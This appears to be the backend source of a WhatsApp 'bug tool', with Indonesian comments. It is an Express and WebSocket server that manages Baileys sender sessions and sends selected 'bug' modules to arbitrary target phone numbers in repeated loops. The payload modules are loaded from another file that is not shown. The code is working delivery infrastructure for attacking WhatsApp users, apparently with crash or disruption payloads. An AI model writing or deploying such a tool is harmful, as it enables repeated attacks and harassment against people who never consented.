// ============================================================
// XSec // BUG TOOL — Backend Server
// Express + WebSocket + Baileys multi-session
// ============================================================

import express from 'express';
import http from 'http';
import { WebSocketServer } from 'ws';
import cors from 'cors';
import { createSender, getSender, disconnectSender } from './baileys.js';
import { listBugs, getBug } from './bug-loader.js';

const app = express();
app.use(cors());
app.use(express.json());

const server = http.createServer(app);
const wss = new WebSocketServer({ server });

// ==================== REST API ====================

app.get('/', (req, res) => {
  res.json({
    ok: true,
    service: 'XSec Backend',
    status: 'running',
    time: new Date().toISOString(),
  });
});

app.get('/api/bugs', (req, res) => {
  res.json({ ok: true, bugs: listBugs() });
});

app.post('/api/sender/init', async (req, res) => {
  const { number } = req.body;
  if (!number || number.length < 9) {
    return res.json({ ok: false, error: 'Nomor tidak valid' });
  }
  try {
    await createSender(number);
    res.json({ ok: true });
  } catch (err) {
    res.json({ ok: false, error: err.message });
  }
});

app.post('/api/sender/disconnect', async (req, res) => {
  const { number } = req.body;
  try {
    await disconnectSender(number);
    res.json({ ok: true });
  } catch (err) {
    res.json({ ok: false, error: err.message });
  }
});

app.post('/api/bug/send', async (req, res) => {
  const { sender, bug, target, repeat } = req.body;

  const senderInst = getSender(sender);
  if (!senderInst) {
    return res.json({ ok: false, error: 'Sender belum terhubung' });
  }

  const bugMod = getBug(bug);
  if (!bugMod) {
    return res.json({ ok: false, error: 'Bug tidak ditemukan' });
  }

  const jobId = `job_${Date.now()}`;
  res.json({ ok: true, jobId });

  // Fire & forget — log lewat WS
  (async () => {
    const ws = senderInst.ws;
    const log = (msg, level = 'info') => {
      if (ws && ws.readyState === 1) {
        ws.send(JSON.stringify({ type: 'log', data: msg, level }));
      }
    };

    log(`▶ Mulai job ${jobId}: ${bug} → ${target} (${repeat}x)`);

    const targetJid = `${target}@s.whatsapp.net`;

    for (let i = 1; i <= repeat; i++) {
      try {
        await bugMod.execute({
          sock: senderInst.sock,
          target: targetJid,
        });
        log(`[${i}/${repeat}] ✓ Terkirim`, 'ok');
      } catch (err) {
        log(`[${i}/${repeat}] ✗ ${err.message}`, 'err');
      }
      await new Promise(r => setTimeout(r, 800));
    }

    log(`✓ Job ${jobId} selesai.`, 'ok');
  })();
});

// ==================== WEBSOCKET ====================

wss.on('connection', (ws, req) => {
  const match = req.url.match(/^\/ws\/sender\/(\d+)/);
  if (!match) {
    ws.close();
    return;
  }

  const senderNum = match[1];
  const sender = getSender(senderNum);
  if (!sender) {
    ws.close();
    return;
  }

  sender.ws = ws;

  // 🔥 HEARTBEAT — kirim ping tiap 25s biar Railway nggak timeout
  const pingInterval = setInterval(() => {
    if (ws.readyState === 1) {
      try { ws.ping(); } catch {}
    }
  }, 25000);

  // Kalau sudah connect, langsung notify
  if (sender.sock?.user) {
    ws.send(JSON.stringify({
      type: 'connected',
      data: {
        jid: sender.sock.user.id.split(':')[0] + '@s.whatsapp.net',
        pushName: sender.sock.user.name || 'Unknown',
      },
    }));
  }

  ws.on('close', () => {
    clearInterval(pingInterval);
    if (sender.ws === ws) sender.ws = null;
  });

  ws.on('error', () => {
    clearInterval(pingInterval);
  });
});

// ==================== START ====================

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`[XSec] Backend running on port ${PORT}`);
  console.log(`[XSec] Bugs loaded: ${listBugs().length}`);
});

// ==================== GRACEFUL SHUTDOWN ====================

process.on('SIGTERM', () => {
  console.log('[XSec] SIGTERM received, closing...');
  server.close(() => {
    console.log('[XSec] Server closed.');
    process.exit(0);
  });
});
